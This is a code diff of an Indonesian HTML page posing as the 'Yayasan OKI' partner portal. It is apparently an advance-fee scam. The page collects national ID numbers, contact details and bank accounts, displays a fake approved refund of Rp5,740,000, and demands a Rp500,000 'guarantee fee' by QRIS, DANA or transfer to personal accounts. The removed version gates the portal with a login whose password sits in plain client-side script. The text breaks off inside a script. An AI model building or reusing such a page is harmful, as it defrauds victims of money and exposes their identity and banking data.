@@ -1,33 +1,743 @@
-<!doctype html><html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Portal Yayasan OKI</title>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Yayasan OKI | Pendaftaran & Pemutusan Mitra</title>
+<meta name="description" content="Portal administrasi Yayasan OKI untuk pendaftaran dan pemutusan hubungan mitra kerja.">
+
 <style>
-*{box-sizing:border-box}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:linear-gradient(145deg,#043d22,#09612f);color:#172039}.screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px}.card,.status{width:min(800px,100%);background:#fff;border-radius:38px;padding:62px 68px;box-shadow:0 20px 60px #0003}.logo{width:132px;height:132px;margin:0 auto 42px;border-radius:50%;display:grid;place-items:center;background:linear-gradient(145deg,#08783a,#16bd5a);color:#fff;font-size:42px;font-weight:800}h1{text-align:center;font-size:42px;margin:0 0 20px}.sub{text-align:center;color:#63758f;font-size:23px;margin:0 0 55px}label{display:block;font-size:21px;font-weight:800;margin-bottom:13px}input{width:100%;height:70px;border:2px solid #d8e1dc;border-radius:20px;padding:0 24px;font-size:20px;margin-bottom:30px}button{width:100%;height:76px;border:0;border-radius:20px;background:#09612f;color:#fff;font-size:22px;font-weight:900;cursor:pointer}.err{display:none;color:#b42318;text-align:center;font-weight:700;margin:-8px 0 18px}.hidden{display:none!important}.status{padding:0;overflow:hidden}.head{background:#a90f17;color:#fff;padding:27px 30px}.head small{opacity:.9}.head h2{margin:8px 0 0;font-size:31px}.body{padding:30px}.alert{background:#fff2f2;border:2px solid #e1252d;color:#8d1117;border-radius:18px;padding:22px;line-height:1.6;font-size:18px}.alert strong{display:block;font-size:24px}.pay{margin-top:20px;padding:22px;background:#f5faf7;border:1px solid #d7e9de;border-radius:18px}.pay b{font-size:25px;color:#08622f}.pending{display:inline-block;margin-top:14px;background:#d71920;color:#fff;border-radius:99px;padding:8px 15px;font-weight:900}.actions{display:flex;gap:12px;margin-top:24px}.wa{background:#128c48}.email{background:#0869a8}.logout{background:#e9eef0;color:#173042}.note{font-size:13px;color:#66778a;line-height:1.5;margin-top:-20px;margin-bottom:20px}@media(max-width:600px){.card{padding:65px 28px 58px}h1{font-size:31px}.sub{font-size:20px}.actions{flex-direction:column}.status{border-radius:28px}.body{padding:22px}}
-</style></head><body>
-<section id="login" class="screen"><div class="card"><div class="logo">OKI</div><h1>Portal Yayasan OKI</h1><p class="sub">Silakan masuk untuk mengakses portal.</p>
-<form id="form"><label>Username</label><input id="u" placeholder="Username" required><label>Password</label><input id="p" type="password" placeholder="Password" required><div id="err" class="err">Username atau password tidak sesuai.</div><button>MASUK KE PORTAL</button></form></div></section>
-<section id="portal" class="screen hidden"><div class="status"><div class="head"><small>PORTAL YAYASAN OKI</small><h2>Status Mitra</h2></div><div class="body">
-<div class="alert"><strong>STATUS PEMUTUSAN MITRA: PENDING</strong>Harap lakukan pembayaran ulang kepada admin untuk proses konfirmasi status mitra.</div>
-<div class="pay">Nominal pembayaran<br><b>Rp500.000</b><br>Pembayaran melalui DANA<br><b>089520623922</b><br>Admin: <strong>Nisa</strong><br><span class="pending">PENDING</span></div>
-<label for="proof" style="margin-top:25px">Bukti Transfer *</label><input id="proof" type="file" accept="image/*,application/pdf" required><div class="note">Bukti transfer wajib dipilih sebelum konfirmasi.</div>
-<div class="actions"><button class="wa" id="send">KONFIRMASI VIA WHATSAPP</button><button class="email" id="sendEmail">KONFIRMASI VIA EMAIL</button><button class="logout" id="out">KELUAR</button></div>
-</div></div></section>
+:root{
+ --primary:#14532d;
+ --primary2:#166534;
+ --green:#22c55e;
+ --dark:#0f172a;
+ --text:#334155;
+ --muted:#64748b;
+ --light:#f0fdf4;
+ --border:#dbe4df;
+ --white:#fff;
+ --orange:#c2410c;
+ --orangebg:#fff7ed;
+ --danger:#991b1b;
+ --dangerbg:#fef2f2;
+ --shadow:0 15px 45px rgba(15,23,42,.10);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+ font-family:Inter,Segoe UI,Arial,sans-serif;
+ color:var(--text);background:#f8fafc;line-height:1.6;
+}
+.navbar{
+ position:sticky;top:0;z-index:1000;background:rgba(255,255,255,.96);
+ backdrop-filter:blur(14px);border-bottom:1px solid #e2e8f0;
+}
+.nav-container{
+ max-width:1200px;margin:auto;padding:14px 22px;display:flex;
+ align-items:center;justify-content:space-between;
+}
+.logo-area{display:flex;align-items:center;gap:12px}
+.logo{
+ width:50px;height:50px;border-radius:50%;
+ background:linear-gradient(135deg,var(--primary),var(--green));
+ color:white;display:flex;align-items:center;justify-content:center;
+ font-weight:900;font-size:17px;
+}
+.logo-text strong{display:block;color:var(--primary);font-size:18px}
+.logo-text span{font-size:12px;color:var(--muted)}
+.nav-links{display:flex;gap:22px;list-style:none}
+.nav-links a{text-decoration:none;color:var(--text);font-weight:700;font-size:14px}
+.nav-links a:hover{color:var(--primary)}
+.nav-button{background:var(--primary);color:white!important;padding:10px 17px;border-radius:30px}
+
+.hero{
+ min-height:570px;color:white;overflow:hidden;position:relative;
+ background:linear-gradient(120deg,rgba(15,75,42,.97),rgba(22,101,52,.85)),
+ radial-gradient(circle at top right,#4ade80,transparent 42%);
+}
+.hero-container{
+ max-width:1200px;margin:auto;padding:85px 22px;display:grid;
+ grid-template-columns:1.15fr .85fr;gap:55px;align-items:center;
+}
+.badge{
+ display:inline-block;padding:8px 14px;border:1px solid rgba(255,255,255,.3);
+ background:rgba(255,255,255,.1);border-radius:30px;font-size:12px;
+ margin-bottom:20px;letter-spacing:.5px;
+}
+.hero h1{font-size:clamp(40px,6vw,68px);line-height:1.05;margin-bottom:22px}
+.hero h1 span{color:#86efac}
+.hero p{font-size:18px;max-width:650px;color:#dcfce7;margin-bottom:30px}
+.hero-buttons{display:flex;gap:13px;flex-wrap:wrap}
+.btn{
+ border:0;cursor:pointer;padding:13px 21px;border-radius:12px;
+ font-weight:800;text-decoration:none;display:inline-flex;
+ align-items:center;justify-content:center;transition:.2s;
+}
+.btn:hover{transform:translateY(-2px)}
+.btn-primary{background:#22c55e;color:white}
+.btn-white{background:white;color:var(--primary)}
+.hero-card{
+ background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);
+ padding:27px;border-radius:24px;backdrop-filter:blur(14px);
+}
+.hero-card h3{margin-bottom:17px}
+.hero-card-item{display:flex;gap:12px;margin:16px 0}
+.icon{
+ width:40px;height:40px;flex:none;border-radius:10px;
+ background:rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center;
+}
+
+section{padding:78px 20px}
+.container{max-width:1100px;margin:auto}
+.section-title{text-align:center;margin-bottom:42px}
+.section-title small{color:var(--primary2);font-weight:900;text-transform:uppercase;letter-spacing:2px}
+.section-title h2{color:var(--dark);font-size:38px;margin:7px 0}
+.section-title p{color:var(--muted)}
+
+.services{background:white}
+.service-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:25px}
+.service-card{
+ padding:33px;border:1px solid var(--border);border-radius:22px;
+ background:white;box-shadow:var(--shadow);transition:.25s;
+}
+.service-card:hover{transform:translateY(-4px)}
+.service-icon{
+ width:60px;height:60px;border-radius:17px;background:var(--light);
+ color:var(--primary);display:flex;align-items:center;justify-content:center;
+ font-size:28px;margin-bottom:18px;
+}
+.service-card h3{color:var(--dark);margin-bottom:9px}
+.service-card p{color:var(--muted);margin-bottom:18px}
+.service-card ul{padding-left:20px}
+
+.form-section{background:linear-gradient(rgba(240,253,244,.93),rgba(240,253,244,.93))}
+.form-box{
+ max-width:880px;margin:auto;background:white;padding:38px;
+ border-radius:25px;box-shadow:var(--shadow);
+}
+.form-tabs{
+ display:grid;grid-template-columns:1fr 1fr;background:#f1f5f9;
+ padding:5px;border-radius:12px;margin-bottom:28px;
+}
+.tab{
+ border:0;background:transparent;padding:13px;border-radius:9px;
+ cursor:pointer;font-weight:800;color:var(--muted);
+}
+.tab.active{background:var(--primary);color:white}
+.form-title{margin-bottom:24px}
+.form-title h3{color:var(--dark);font-size:25px}
+.form-title p{color:var(--muted);font-size:14px}
+.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.form-group{margin-bottom:18px}
+.form-group.full{grid-column:1/-1}
+label{display:block;margin-bottom:7px;font-weight:800;color:#1e293b;font-size:14px}
+.required{color:#dc2626}
+input,select,textarea{
+ width:100%;border:1px solid var(--border);border-radius:10px;padding:13px 14px;
+ font-size:15px;outline:none;background:#fff;transition:.2s;
+}
+input:focus,select:focus,textarea:focus{
+ border-color:var(--green);box-shadow:0 0 0 3px rgba(34,197,94,.12)
+}
+textarea{min-height:125px;resize:vertical}
+.file-box{border:2px dashed #bbf7d0;background:#f0fdf4;padding:20px;border-radius:12px}
+.file-box small{display:block;margin-top:6px;color:var(--muted)}
+.checkbox{display:flex;gap:10px;align-items:flex-start;margin:20px 0}
+.checkbox input{width:auto;margin-top:5px}
+.checkbox label{font-weight:500;margin:0;font-size:13px}
+.submit-btn{
+ width:100%;background:var(--primary);color:white;padding:15px;border-radius:11px;
+ border:0;font-size:16px;font-weight:900;cursor:pointer;
+}
+.submit-btn:hover{background:var(--primary2)}
+.success{
+ display:none;padding:18px;background:#dcfce7;border:1px solid #86efac;
+ color:#166534;border-radius:12px;margin-bottom:20px;font-weight:700;
+}
+
+.jaminan-box{
+ display:none;margin:25px 0;padding:24px;border-radius:20px;
+ background:#fff;border:1px solid #fed7aa;box-shadow:0 10px 30px rgba(0,0,0,.05);
+}
+.jaminan-header{display:flex;gap:14px;align-items:center;margin-bottom:19px}
+.jaminan-icon{
+ width:52px;height:52px;border-radius:14px;background:var(--orangebg);
+ display:flex;align-items:center;justify-content:center;font-size:25px;
+}
+.jaminan-header h3{color:#9a3412;margin:0 0 3px;font-size:19px}
+.jaminan-header p{margin:0;color:#78716c;font-size:13px}
+.jaminan-nominal{
+ background:var(--orangebg);border:1px solid #fed7aa;border-radius:14px;
+ padding:17px;display:flex;justify-content:space-between;align-items:center;margin-bottom:23px;
+}
+.jaminan-nominal span{color:#7c2d12;font-weight:700}
+.jaminan-nominal strong{font-size:25px;color:var(--orange)}
+.qris-container{
+ text-align:center;padding:23px 13px;border:1px solid #e2e8f0;
+ border-radius:18px;background:#fafafa;margin-bottom:19px;
+}
+.qris-title{font-weight:900;color:#0f172a;margin-bottom:14px;letter-spacing:1px}
+.qris-image{width:100%;max-width:430px;display:block;margin:auto;border-radius:10px}
+.qris-name{margin:13px 0 3px;font-size:17px;font-weight:900;color:#14532d}
+.qris-note{color:#64748b;font-size:13px}
+.ketentuan-box{
+ padding:19px;border-radius:15px;background:#f8fafc;border:1px solid #e2e8f0;
+}
+.ketentuan-box h4{margin-bottom:10px;color:#0f172a}
+.ketentuan-box ul{padding-left:20px}
+.ketentuan-box li{margin:8px 0;font-size:13px;color:#475569}
+.peringatan-box{
+ margin-top:17px;padding:17px;border-radius:14px;background:var(--dangerbg);
+ border:1px solid #fecaca;color:var(--danger)
+}
+.peringatan-box strong{display:block;margin-bottom:7px}
+.peringatan-box p{font-size:13px;line-height:1.7;margin:5px 0}
+.konfirmasi-bayar{
+ margin-top:18px;padding:15px;background:#f0fdf4;border-radius:12px;border:1px solid #bbf7d0;
+}
+.konfirmasi-bayar label{display:flex;gap:10px;align-items:flex-start;font-size:13px;font-weight:700;color:#166534}
+.konfirmasi-bayar input{width:auto;margin-top:3px}
+
+.steps{background:white}
+.step-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.step{text-align:center;padding:20px}
+.step-number{
+ width:55px;height:55px;margin:0 auto 15px;border-radius:50%;
+ background:var(--primary);color:white;display:flex;align-items:center;justify-content:center;
+ font-size:20px;font-weight:900;
+}
+.step h4{color:var(--dark);margin-bottom:6px}
+.step p{color:var(--muted);font-size:13px}
+
+.faq{background:#f8fafc}
+.faq-item{background:white;border:1px solid #e2e8f0;border-radius:12px;margin-bottom:11px;overflow:hidden}
+.faq-question{
+ width:100%;text-align:left;background:white;border:0;padding:17px 20px;
+ font-weight:800;color:var(--dark);cursor:pointer;
+}
+.faq-answer{display:none;padding:0 20px 17px;color:var(--muted)}
+.faq-item.open .faq-answer{display:block}
+
+footer{background:#0f172a;color:white;padding:52px 20px 24px}
+.footer-grid{max-width:1100px;margin:auto;display:grid;grid-template-columns:2fr 1fr 1fr;gap:38px}
+footer h3{margin-bottom:13px}
+footer p,footer li{color:#94a3b8;font-size:14px}
+footer ul{list-style:none}
+footer li{margin:7px 0}
+.footer-bottom{
+ max-width:1100px;margin:32px auto 0;padding-top:19px;border-top:1px solid #1e293b;
+ text-align:center;color:#64748b;font-size:13px
+}
+.whatsapp{
+ position:fixed;right:20px;bottom:20px;width:57px;height:57px;border-radius:50%;
+ background:#25D366;color:white;display:flex;align-items:center;justify-content:center;
+ font-size:25px;text-decoration:none;box-shadow:0 8px 25px rgba(0,0,0,.2);z-index:999;
+}
+.notice{
+ padding:12px 15px;border-radius:10px;background:#f8fafc;border:1px solid #e2e8f0;
+ font-size:12px;color:#64748b;margin-bottom:18px;
+}
+
+@media(max-width:800px){
+ .nav-links{display:none}
+ .hero-container{grid-template-columns:1fr;padding:65px 20px}
+ .hero-card{display:none}
+ .service-grid{grid-template-columns:1fr}
+ .form-grid{grid-template-columns:1fr}
+ .form-group.full{grid-column:auto}
+ .step-grid{grid-template-columns:1fr 1fr}
+ .footer-grid{grid-template-columns:1fr}
+ .form-box{padding:24px 18px}
+ .section-title h2{font-size:30px}
+}
+@media(max-width:480px){
+ .step-grid{grid-template-columns:1fr}
+ .hero h1{font-size:42px}
+ .hero-buttons .btn{width:100%}
+ .jaminan-nominal{display:block}
+ .jaminan-nominal strong{display:block;margin-top:5px}
+}
+
+.login-screen{position:fixed;inset:0;z-index:9999;background:linear-gradient(135deg,#052e16,#14532d);display:flex;align-items:center;justify-content:center;padding:20px}
+.login-card{width:min(420px,100%);background:#fff;border-radius:24px;padding:32px;box-shadow:0 25px 70px rgba(0,0,0,.28)}
+.login-logo{width:62px;height:62px;border-radius:50%;margin:0 auto 15px;background:linear-gradient(135deg,#14532d,#22c55e);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:20px}
+.login-card h2{text-align:center;color:#0f172a;margin-bottom:5px}
+.login-card>p{text-align:center;color:#64748b;font-size:14px;margin-bottom:22px}
+.login-card label{margin-top:12px}
+.login-error{display:none;background:#fef2f2;border:1px solid #fecaca;color:#991b1b;border-radius:9px;padding:10px;font-size:13px;margin:12px 0}
+.bank-payment{margin:20px 0;padding:20px;border-radius:16px;background:#eff6ff;border:1px solid #bfdbfe}
+.bank-payment-title{font-weight:900;color:#1e3a8a;margin-bottom:12px}
+.bank-row{display:flex;justify-content:space-between;gap:15px;padding:10px 0;border-bottom:1px solid #dbeafe;font-size:14px}
+.bank-row:last-of-type{border-bottom:0}
+.bank-row span{color:#475569}.bank-row strong{color:#0f172a;text-align:right}
+.bank-note{font-size:12px;color:#475569;margin-top:12px;line-height:1.6}
+
+</style>
+</head>
+
+<body>
+<div id="loginScreen" class="login-screen">
+ <div class="login-card">
+  <div class="login-logo">OKI</div>
+  <h2>Portal Yayasan OKI</h2>
+  <p>Silakan masuk untuk mengakses portal.</p>
+  <form id="loginForm">
+   <label for="loginUser">Username</label>
+   <input id="loginUser" type="text" autocomplete="username" placeholder="Username" required>
+   <label for="loginPass">Password</label>
+   <input id="loginPass" type="password" autocomplete="current-password" placeholder="Password" required>
+   <div id="loginError" class="login-error">Username atau password salah.</div>
+   <button type="submit" class="submit-btn">MASUK KE PORTAL</button>
+  </form>
+ </div>
+</div>
+
+<nav class="navbar">
+ <div class="nav-container">
+  <div class="logo-area">
+   <div class="logo">OKI</div>
+   <div class="logo-text">
+    <strong>YAYASAN OKI</strong>
+    <span>Portal Mitra Kerja</span>
+   </div>
+  </div>
+  <ul class="nav-links">
+   <li><a href="#beranda">Beranda</a></li>
+   <li><a href="#layanan">Layanan</a></li>
+   <li><a href="#proses">Proses</a></li>
+   <li><a href="#faq">FAQ</a></li>
+   <li><a href="#pendaftaran" class="nav-button">Daftar Sekarang</a></li>
+  </ul>
+ </div>
+</nav>
+
+<section id="refundPortal" style="padding:42px 20px;background:#f0fdf4">
+ <div class="container" style="max-width:850px">
+  <div class="service-card" style="border-color:#bbf7d0">
+   <div class="section-title" style="margin-bottom:20px">
+    <small>Dashboard Member</small>
+    <h2 style="font-size:30px">Pemutusan Mitra Kerja</h2>
+    <p>Status pengajuan: <strong style="color:#15803d">ACC</strong></p>
+   </div>
+   <div class="jaminan-nominal" style="background:#ecfdf5;border-color:#bbf7d0">
+    <span style="color:#166534">Pengembalian dana</span>
+    <strong style="color:#166534">Rp 5.740.000</strong>
+   </div>
+   <p class="notice">Simulasi tampilan portal: nominal dan status di halaman ini bukan bukti persetujuan bank, bukan konfirmasi transfer, dan tidak menjamin dana akan cair. Verifikasi pengembalian dana melalui pihak/lembaga resmi.</p>
+   <div id="payoutFormWrap">
+    <h3 style="margin:18px 0 12px;color:#0f172a">Data rekening penerima</h3>
+    <form id="payoutForm">
+     <div class="form-group">
+      <label for="payoutName">Nama pemilik rekening</label>
+      <input id="payoutName" type="text" autocomplete="name" placeholder="Masukkan nama sesuai rekening" required>
+     </div>
+     <div class="form-group">
+      <label for="payoutAccount">Nomor rekening</label>
+      <input id="payoutAccount" type="text" inputmode="numeric" autocomplete="off" placeholder="Masukkan nomor rekening" required>
+     </div>
+     <button class="submit-btn" type="submit">CAIRKAN</button>
+    </form>
+   </div>
+   <div id="payoutStatus" class="success" role="status" aria-live="polite" style="display:none;margin-top:20px">
+    Status: <strong>Wait..aprove</strong><br>
+    Data rekening telah dicatat pada simulasi halaman ini. Belum ada transfer atau pencairan dana yang dilakukan.
+   </div>
+  </div>
+ </div>
+</section>
+
+<section class="hero" id="beranda">
+ <div class="hero-container">
+  <div>
+   <span class="badge">PORTAL ADMINISTRASI YAYASAN OKI</span>
+   <h1>Kerja Sama <span>Lebih Profesional.</span></h1>
+   <p>
+    Portal online untuk pendaftaran mitra kerja dan pengajuan
+    pemutusan hubungan mitra secara terstruktur.
+   </p>
+   <div class="hero-buttons">
+    <a href="#pendaftaran" class="btn btn-primary" onclick="pilihForm('daftar')">📝 Pendaftaran Mitra</a>
+    <a href="#pendaftaran" class="btn btn-white" onclick="pilihForm('putus')">📑 Pemutusan Mitra</a>
+   </div>
+  </div>
+  <div class="hero-card">
+   <h3>Layanan Mitra Kerja</h3>
+   <div class="hero-card-item"><div class="icon">✓</div><div><strong>Pendaftaran Online</strong><p>Daftar sebagai mitra secara online.</p></div></div>
+   <div class="hero-card-item"><div class="icon">📄</div><div><strong>Dokumen PDF</strong><p>Upload dokumen pendukung dengan mudah.</p></div></div>
+   <div class="hero-card-item"><div class="icon">🔒</div><div><strong>Administrasi Terstruktur</strong><p>Data tersusun untuk proses administrasi.</p></div></div>
+  </div>
+ </div>
+</section>
+
+<section class="services" id="layanan">
+ <div class="container">
+  <div class="section-title">
+   <small>Layanan Kami</small>
+   <h2>Administrasi Mitra Kerja</h2>
+   <p>Pilih layanan sesuai kebutuhan Anda.</p>
+  </div>
+  <div class="service-grid">
+   <div class="service-card">
+    <div class="service-icon">📝</div>
+    <h3>Pendaftaran Mitra Kerja</h3>
+    <p>Ajukan pendaftaran sebagai mitra kerja Yayasan OKI.</p>
+    <ul><li>Data identitas</li><li>Kontak dan pendidikan</li><li>Data rekening</li><li>Dokumen PDF</li></ul><br>
+    <a href="#pendaftaran" onclick="pilihForm('daftar')" class="btn btn-primary">Daftar Mitra</a>
+   </div>
+   <div class="service-card">
+    <div class="service-icon">📑</div>
+    <h3>Pemutusan Hubungan Mitra</h3>
+    <p>Ajukan pemutusan hubungan mitra melalui sistem online.</p>
+    <ul><li>Data identitas</li><li>Data rekening</li><li>Alasan pemutusan</li><li>Pembayaran jaminan</li></ul><br>
+    <a href="#pendaftaran" onclick="pilihForm('putus')" class="btn btn-primary">Ajukan Pemutusan</a>
+   </div>
+  </div>
+ </div>
+</section>
+
+<section class="form-section" id="pendaftaran">
+ <div class="container">
+  <div class="section-title">
+   <small>Form Online</small>
+   <h2>Pendaftaran & Administrasi</h2>
+   <p>Isi data dengan benar sesuai dokumen resmi.</p>
+  </div>
+
+  <div class="form-box">
+   <div class="form-tabs">
+    <button class="tab active" id="tabDaftar" onclick="pilihForm('daftar')">📝 Pendaftaran Mitra</button>
+    <button class="tab" id="tabPutus" onclick="pilihForm('putus')">📑 Pemutusan Mitra</button>
+   </div>
+
+   <div id="successMessage" class="success">
+    ✓ Form berhasil divalidasi. Untuk produksi, data perlu dihubungkan ke backend/server Yayasan.
+   </div>
+
+   <div class="form-title">
+    <h3 id="formHeading">Form Pendaftaran Mitra Kerja</h3>
+    <p id="formDescription">Silakan lengkapi seluruh data yang diperlukan.</p>
+   </div>
+
+   <form id="mainForm">
+    <div class="form-grid">
+
+     <div class="form-group">
+      <label>Nama Lengkap <span class="required">*</span></label>
+      <input type="text" id="nama" name="nama" placeholder="Masukkan nama lengkap" required>
+     </div>
+
+     <div class="form-group">
+      <label>NIK <span class="required">*</span></label>
+      <input type="text" id="nik" name="nik" inputmode="numeric" maxlength="16" placeholder="16 digit NIK" required>
+     </div>
+
+     <div class="form-group">
+      <label>Nomor HP <span class="required">*</span></label>
+      <input type="tel" id="hp" name="hp" placeholder="Contoh: 081234567890" required>
+     </div>
+
+     <div class="form-group">
+      <label>Email <span class="required">*</span></label>
+      <input type="email" id="email" name="email" placeholder="nama@email.com" required>
+     </div>
+
+     <div class="form-group">
+      <label>Pendidikan Terakhir <span class="required">*</span></label>
+      <select id="pendidikan" name="pendidikan" required>
+       <option value="">Pilih pendidikan</option>
+       <option>SD / Sederajat</option><option>SMP / Sederajat</option>
+       <option>SMA / SMK / Sederajat</option><option>D1</option><option>D2</option>
+       <option>D3</option><option>D4</option><option>S1</option><option>S2</option><option>S3</option>
+      </select>
+     </div>
+
+     <div class="form-group">
+      <label>Bank <span class="required">*</span></label>
+      <select id="bank" name="bank" required>
+       <option value="">Pilih bank</option>
+       <option>BCA</option><option>BRI</option><option>BNI</option><option>Mandiri</option>
+       <option>BSI</option><option>CIMB Niaga</option><option>Bank Jateng</option>
+       <option>Bank Jatim</option><option>Bank Lainnya</option>
+      </select>
+     </div>
+
+     <div class="form-group">
+      <label>Nomor Rekening <span class="required">*</span></label>
+      <input type="text" id="rekening" name="rekening" inputmode="numeric" placeholder="Masukkan nomor rekening" required>
+     </div>
+
+     <div class="form-group">
+      <label>Nama Pemilik Rekening <span class="required">*</span></label>
+      <input type="text" id="pemilikRekening" name="pemilikRekening" placeholder="Sesuai nama rekening" required>
+     </div>
+
+     <div class="form-group full">
+      <label>Dokumen PDF <span class="required">*</span></label>
+      <div class="file-box">
+       <input type="file" id="dokumen" name="dokumen" accept="application/pdf" required>
+       <small>Format PDF. Maksimal 5 MB.</small>
+      </div>
+     </div>
+
+     <div class="form-group full" id="alasanGroup" style="display:none">
+      <label>Alasan Pemutusan Hubungan Mitra <span class="required">*</span></label>
+      <textarea id="alasan" name="alasan" placeholder="Jelaskan alasan pengajuan pemutusan hubungan mitra..."></textarea>
+     </div>
+
+    </div>
+
+    <div id="jaminanBox" class="jaminan-box">
+     <div class="jaminan-header">
+      <div class="jaminan-icon">💳</div>
+      <div>
+       <h3>Pembayaran Uang Jaminan Pemutusan Mitra</h3>
+       <p>Pembayaran melalui QRIS yang ditampilkan pada halaman ini.</p>
+      </div>
+     </div>
+
+     <div class="jaminan-nominal">
+      <span>Uang Jaminan</span>
+      <strong>Rp500.000</strong>
+     </div>
+
+     <div class="notice">
+      Pastikan QRIS yang digunakan sesuai dengan QRIS resmi yang ditampilkan oleh Yayasan.
+      Jangan berikan PIN, OTP, password, atau kredensial perbankan kepada siapa pun.
+     </div>
+
+     <div class="qris-container">
+      <div class="qris-title">QRIS PEMBAYARAN UANG JAMINAN</div>
+      <img src="qr-jaminan.jpg" alt="QRIS Pembayaran Uang Jaminan" class="qris-image">
+      <p class="qris-name">Mitra Abadi Dwika Trave</p>
+      <p class="qris-note">Scan QRIS menggunakan aplikasi pembayaran yang mendukung QRIS.</p>
+     </div>
+
+     <div class="bank-payment">
+      <div class="bank-payment-title">🏦 METODE PEMBAYARAN TRANSFER BANK</div>
+      <div class="bank-row"><span>Bank</span><strong>BCA</strong></div>
+      <div class="bank-row"><span>Nomor Rekening</span><strong>2340539985</strong></div>
+      <div class="bank-row"><span>Nama Rekening</span><strong>Endah Dwi</strong></div>
+      <p class="bank-note">Pastikan nama penerima dan nomor rekening sesuai sebelum melakukan transfer. Simpan bukti pembayaran untuk konfirmasi kepada admin resmi.</p>
+     </div>
+
+     <div class="ketentuan-box">
+      <h4>Ketentuan Pengembalian Dana</h4>
+      <ul>
+       <li>Uang jaminan sebesar <strong>Rp500.000</strong> dibayarkan untuk proses pemutusan hubungan mitra.</li>
+       <li>Berdasarkan ketentuan yang berlaku, proses pengembalian dana ditargetkan berlangsung selama <strong>3 jam</strong> dan paling lambat <strong>24 jam / 1 hari kerja</strong> setelah proses dinyatakan selesai.</li>
+       <li>Pengembalian dana ditransfer ke rekening penerima yang didaftarkan pada formulir, sesuai hasil proses dan ketentuan yang berlaku.</li>
+       <li>Seluruh proses pengembalian dilakukan secara online melalui sistem dan tidak dapat diwakilkan oleh staf admin maupun pihak lain.</li>
+       <li>Jika ada pihak yang mengaku dapat melewati atau mempercepat tahapan sistem di luar prosedur resmi, jangan memberikan uang atau data tambahan.</li>
+       <li>Jika terjadi dugaan penyalahgunaan, segera laporkan melalui kanal resmi Yayasan.</li>
+      </ul>
+     </div>
+
+     <div class="peringatan-box">
+      <strong>⚠️ PENTING</strong>
+      <p>Semua proses administrasi dilakukan secara online melalui sistem. Admin tidak dapat melewati atau mengubah tahapan sistem secara manual.</p>
+      <p>Setelah melakukan pembayaran, segera konfirmasi kepada admin resmi masing-masing agar pembayaran dapat diverifikasi dan proses dilanjutkan melalui aplikasi.</p>
+     </div>
+
+     <div class="konfirmasi-bayar">
+      <label>
+       <input type="checkbox" id="sudahBayar">
+       <span>Saya telah membaca ketentuan pembayaran dan memahami bahwa pembayaran hanya dilakukan melalui QRIS/kanal resmi yang ditampilkan pada halaman ini.</span>
+      </label>
+     </div>
+    </div>
+
+    <div class="checkbox">
+     <input type="checkbox" id="persetujuan" required>
+     <label for="persetujuan">
+      Saya menyatakan bahwa data yang saya masukkan benar dan dapat dipertanggungjawabkan.
+      Saya menyetujui penggunaan data untuk keperluan administrasi Yayasan OKI.
+     </label>
+    </div>
+
+    <button type="submit" class="submit-btn" id="submitButton">KIRIM PENDAFTARAN</button>
+   </form>
+  </div>
+ </div>
+</section>
+
+<section class="steps" id="proses">
+ <div class="container">
+  <div class="section-title">
+   <small>Proses</small><h2>Bagaimana Prosesnya?</h2>
+   <p>Proses administrasi dibuat sederhana dan mudah.</p>
+  </div>
+  <div class="step-grid">
+   <div class="step"><div class="step-number">1</div><h4>Isi Form</h4><p>Lengkapi data identitas dan informasi yang diperlukan.</p></div>
+   <div class="step"><div class="step-number">2</div><h4>Upload PDF</h4><p>Upload dokumen pendukung dalam format PDF.</p></div>
+   <div class="step"><div class="step-number">3</div><h4>Verifikasi</h4><p>Data dan pembayaran diverifikasi melalui sistem.</p></div>
+   <div class="step"><div class="step-number">4</div><h4>Proses</h4><p>Pengajuan diproses sesuai ketentuan yang berlaku.</p></div>
+  </div>
+ </div>
+</section>
+
+<section class="faq" id="faq">
+ <div class="container">
+  <div class="section-title"><small>FAQ</small><h2>Pertanyaan Umum</h2></div>
+  <div class="faq-item"><button class="faq-question">Dokumen apa yang dapat diupload?</button><div class="faq-answer">Dokumen harus dalam format PDF dengan ukuran maksimal 5 MB.</div></div>
+  <div class="faq-item"><button class="faq-question">Apakah data rekening harus benar?</button><div class="faq-answer">Ya. Pastikan bank, nomor rekening, dan nama pemilik rekening sesuai agar tidak terjadi kesalahan administrasi.</div></div>
+  <div class="faq-item"><button class="faq-question">Bagaimana jika ingin memutuskan hubungan mitra?</button><div class="faq-answer">Pilih menu Pemutusan Mitra, lengkapi data, alasan, baca ketentuan pembayaran, dan ikuti proses sesuai sistem.</div></div>
+  <div class="faq-item"><button class="faq-question">Apakah admin dapat melewati proses?</button><div class="faq-answer">Menurut ketentuan pada portal ini, seluruh tahapan dilakukan melalui sistem online dan tidak dapat diwakilkan atau dilewati secara manual.</div></div>
+ </div>
+</section>
+
+<footer>
+ <div class="footer-grid">
+  <div>
+   <h3>YAYASAN OKI</h3>
+   <p>Portal administrasi mitra kerja untuk pendaftaran dan pengajuan pemutusan hubungan mitra secara online.</p>
+  </div>
+  <div>
+   <h3>Layanan</h3>
+   <ul><li>Pendaftaran Mitra</li><li>Pemutusan Mitra</li><li>Administrasi</li><li>Verifikasi</li></ul>
+  </div>
+  <div>
+   <h3>Kontak</h3>
+   <ul><li>📞 Nomor HP Yayasan</li><li>✉️ Email Yayasan</li><li>📍 Alamat Yayasan</li></ul>
+  </div>
+ </div>
+ <div class="footer-bottom">© 2026 Yayasan OKI. Seluruh hak cipta dilindungi.</div>
+</footer>
+
+<a href="https://wa.me/6280000000000" target="_blank" class="whatsapp" aria-label="WhatsApp">☎</a>
+
 <script>
-const WA="6289520623922";
-document.getElementById("form").onsubmit=e=>{e.preventDefault();let u=document.getElementById("u").value.trim().toLowerCase(),p=document.getElementById("p").value;if(u==="yayasan oki"&&p==="nia12321"){login.classList.add("hidden");portal.classList.remove("hidden")}else err.style.display="block"};
-document.getElementById("sendEmail").onclick=()=>{
